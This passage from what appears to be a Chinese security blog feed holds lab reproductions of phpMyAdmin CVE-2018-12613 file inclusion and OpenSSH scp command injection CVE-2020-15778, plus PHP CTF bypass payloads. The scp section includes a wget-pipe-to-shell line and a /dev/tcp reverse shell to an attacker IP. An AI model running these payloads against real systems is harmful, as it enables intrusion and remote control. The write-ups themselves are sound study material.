class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'db_datadict.php'</span>,</span><br><span class="line">        <span class="string">'db_sql.php'</span>,</span><br><span class="line">        <span class="string">'db_events.php'</span>,</span><br><span class="line">        <span class="string">'db_export.php'</span>,</span><br><span class="line">        <span class="string">'db_importdocsql.php'</span>,</span><br><span class="line">        <span class="string">'db_multi_table_query.php'</span>,</span><br><span class="line">        <span class="string">'db_structure.php'</span>,</span><br><span class="line">        <span class="string">'db_import.php'</span>,</span><br><span class="line">        <span class="string">'db_operations.php'</span>,</span><br><span class="line">        <span class="string">'db_search.php'</span>,</span><br><span class="line">        <span class="string">'db_routines.php'</span>,</span><br><span class="line">        <span class="string">'export.php'</span>,</span><br><span class="line">        <span class="string">'import.php'</span>,</span><br><span class="line">        <span class="string">'index.php'</span>,</span><br><span class="line">        <span class="string">'pdf_pages.php'</span>,</span><br><span class="line">        <span class="string">'pdf_schema.php'</span>,</span><br><span class="line">        <span class="string">'server_binlog.php'</span>,</span><br><span class="line">        <span class="string">'server_collations.php'</span>,</span><br><span class="line">        <span class="string">'server_databases.php'</span>,</span><br><span class="line">        <span class="string">'server_engines.php'</span>,</span><br><span class="line">        <span class="string">'server_export.php'</span>,</span><br><span class="line">        <span class="string">'server_import.php'</span>,</span><br><span class="line">        <span class="string">'server_privileges.php'</span>,</span><br><span class="line">        <span class="string">'server_sql.php'</span>,</span><br><span class="line">        <span class="string">'server_status.php'</span>,</span><br><span class="line">        <span class="string">'server_status_advisor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_monitor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_queries.php'</span>,</span><br><span class="line">        <span class="string">'server_status_variables.php'</span>,</span><br><span class="line">        <span class="string">'server_variables.php'</span>,</span><br><span class="line">        <span class="string">'sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_addfield.php'</span>,</span><br><span class="line">        <span class="string">'tbl_change.php'</span>,</span><br><span class="line">        <span class="string">'tbl_create.php'</span>,</span><br><span class="line">        <span class="string">'tbl_import.php'</span>,</span><br><span class="line">        <span class="string">'tbl_indexes.php'</span>,</span><br><span class="line">        <span class="string">'tbl_sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_export.php'</span>,</span><br><span class="line">        <span class="string">'tbl_operations.php'</span>,</span><br><span class="line">        <span class="string">'tbl_structure.php'</span>,</span><br><span class="line">        <span class="string">'tbl_relation.php'</span>,</span><br><span class="line">        <span class="string">'tbl_replace.php'</span>,</span><br><span class="line">        <span class="string">'tbl_row_action.php'</span>,</span><br><span class="line">        <span class="string">'tbl_select.php'</span>,</span><br><span class="line">        <span class="string">'tbl_zoom_select.php'</span>,</span><br><span class="line">        <span class="string">'transformation_overview.php'</span>,</span><br><span class="line">        <span class="string">'transformation_wrapper.php'</span>,</span><br><span class="line">        <span class="string">'user_password.php'</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>只要传入的参数在白名单中就会返回True</p><p>总的来说，这个漏洞就是利用<code>urldecode()</code>函数绕过白名单检测，<code>?</code>进行两次url编码得到<code>%253f</code>，传入的<code>%253f</code>经过服务器的自动解码和函数解码之后，就会截取<code>?</code>之前的内容，只要在白名单中就会返回<code>true</code>。而在index.php中，会进行包含，只有服务端进行了一次url解码，也就是<code>???.php%3f</code>,php默认解析成目录，所以要跳出该文件夹目录。</p><h2 id="0x06漏洞利用"><a href="#0x06漏洞利用" class="headerlink" title="0x06漏洞利用"></a>0x06漏洞利用</h2><h3 id="1-读取phpinfo"><a href="#1-读取phpinfo" class="headerlink" title="1.读取phpinfo"></a>1.读取phpinfo</h3><p>在www目录下新建<code>phpinfo.php</code>，尝试包含读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//localhost/phpMyAdmin-4.8.1-all-languages/phpMyAdmin-4.8.1-all-languages/index.php?target=db_sql.php%253f/../../../phpinfo.php</span></span><br><span class="line"><span class="comment">//这里注意本身被解码后的db_sql.php%3f/也是一层目录，要用一个../跳出当前目录</span></span><br></pre></td></tr></table></figure><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/1.png" class=""><h3 id="2-写入shell，包含之"><a href="#2-写入shell，包含之" class="headerlink" title="2.写入shell，包含之"></a>2.写入shell，包含之</h3><p>新建数据库，新建表，列名直接插入一句话</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/2.png" class=""><p>在<code>phpStudy/MySQL/data/test</code>路径下， 可以看到生成的<code>test.frm</code>，打开可以看到表的列名</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/3.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../MySQL/data/test/test.frm&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>可以看到包含成功</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/4.png" class=""><h3 id="3-包含日志文件"><a href="#3-包含日志文件" class="headerlink" title="3.包含日志文件"></a>3.包含日志文件</h3><p>sql查询处查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo();?&gt;&#39;</span><br></pre></td></tr></table></figure><p>记下网页的cookie，找到phpMyAdmin的</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/5.png" class=""><p>包含session文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../tmp/tmp/sess_2ro2cebrk3jkqvnp8eoopl0dueisdgj3</span><br></pre></td></tr></table></figure><p>成功包含，看一下效果</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/6.png" class=""><p>相关方面的知识练手可以从下题进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[HCTF%202018]WarmUp</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考文章</span><br><span class="line">http:<span class="comment">//www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-复现分析/</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/weixin_43872099/article/details/104128639</span></span><br><span class="line">https:<span class="comment">//www.phpmyadmin.net/security/PMASA-2018-4/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSH的scp命令注入CVE-2020-15778</title>
      <link href="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/"/>
      <url>/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/</url>
      
        <content type="html"><![CDATA[<p>复现的第一个CVE，虽然比较鸡肋的感觉，但还是有必要记录一下<a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>感觉比较鸡肋的原因，就是得先知道ssh的登录密码，这一点还是比较困难的</p><p>OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令</p><p>SCP(secure copy)是linux系统下基于ssh登录进行安全远程文件拷贝的命令，可以在linux之间复制文件和目录</p><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><p><strong>Openssh</strong></p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>OpenSSH&lt;=8.3p1</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用scp复制文件到远程服务器时，在scp命令后面跟上文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp SourceFile user@ip:directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><p>scp会使用”-t“参数来获取存储传入文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -t directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/1.png" class=""><p>问题在<code>scp.c</code>文件的989行，传入路径未进行检测，利用反引号可以包裹poc，加上文件名执行scp命令。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">环境</span><br><span class="line">靶机：centos</span><br><span class="line">攻击机：kali</span><br><span class="line">场景：已知ssh密码</span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'/tmp/test/111'</span><br></pre></td></tr></table></figure><p>可以看到成功通过scp发送到靶机</p><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/2.png" class=""><p>接下来试着创建一个hack.sh文件，文件内容为空，可以在自己的服务器上搭建包含shell的hack.sh，通过wget命令下载shell并且执行，这里不演示这个过程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'`touch /tmp/test/hack.sh`/tmp/test/444'</span><br></pre></td></tr></table></figure><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/3.png" class=""><p>带wget的poc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'wget https://unknownsource.com/possiblydangerous.sh -O- | sh /tmp/test/444'</span><br></pre></td></tr></table></figure><p>下一步就可以反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'`bash -i &gt;&amp; /dev/tcp/攻击机ip/端口 0&gt;&amp;1`/tmp/test/'</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>厂商暂未发布补丁，建议使用rsync代替scp</p><p>保存好自己的ssh密码，加强密钥强度，周期性更新密码</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;245225.html</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;166028229</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cpandya2909&#x2F;CVE-2020-15778&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPcharacter</title>
      <link href="/2020/09/25/PHPcharacter/"/>
      <url>/2020/09/25/PHPcharacter/</url>
      
        <content type="html"><![CDATA[<p>php特性<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">关于intval函数知识点</span><br><span class="line">int intval ( mixed $var [, int $base = <span class="number">10</span> ] )</span><br><span class="line">参数说明：</span><br><span class="line">$var：要转换成 integer 的数量值。</span><br><span class="line">$base：转化所使用的进制。</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：如果字符串包括了 <span class="string">"0x"</span> (或 <span class="string">"0X"</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；如果字符串以 <span class="string">"0"</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，将使用 <span class="number">10</span> 进制 (decimal)。</span><br></pre></td></tr></table></figure><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[0-9]/"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用数组绕过，intval()函数在处理数组时会返回1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强比较，必须是数值，且值相等</p><p>这里首先想到的是用进制绕过，十六进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br><span class="line">补充，可以增加一个空格绕过</span><br><span class="line">num=%<span class="number">204476</span></span><br></pre></td></tr></table></figure><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^php$/im'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^php$/i'</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'hacker'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求匹配到php但是又不能含有php，这里绕过的点在于正则中的<code>/m</code>,多行匹配模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">cmd=%<span class="number">0</span>aphp</span><br></pre></td></tr></table></figure><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>依旧可以用进制绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了字母</p><p>十六进制用不了，用八进制即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">010574</span></span><br></pre></td></tr></table></figure><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首个字符不能是0</p><p>这里可以利用精度来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">4476.00</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br></pre></td></tr></table></figure><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]|\./i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了点号，依旧有办法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br><span class="line">%<span class="number">20</span>空格占去头个字符，依旧可以用进制绕过</span><br></pre></td></tr></table></figure><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'u'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'u'</span>]==<span class="string">'flag.php'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">'u'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能匹配到flag.php，用伪协议绕过读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">u=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'a'</span>] != $_POST[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MD5强比较，数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_COOKIE:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_SERVER:<span class="string">'flag'</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>?$flag:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察三目运算符以及地址引用传值</p><p>这里要求传给<code>HTTP_FLAG</code>的值为flag</p><p>只要通过GET传递的参数都会被POST传递的覆盖</p><p>也就是说不仅仅要GET传值给<code>HTTP_FLAG</code>,同时用POST传递相同的值</p><p>方便理解，改一下形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>($_GET)&#123;</span><br><span class="line">$_GET=&amp;$_POST;<span class="comment">//GET传值都会被POST覆盖</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">$_GET=&amp;$_COOKIE;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">$_GET=&amp;$_SERVER;</span><br><span 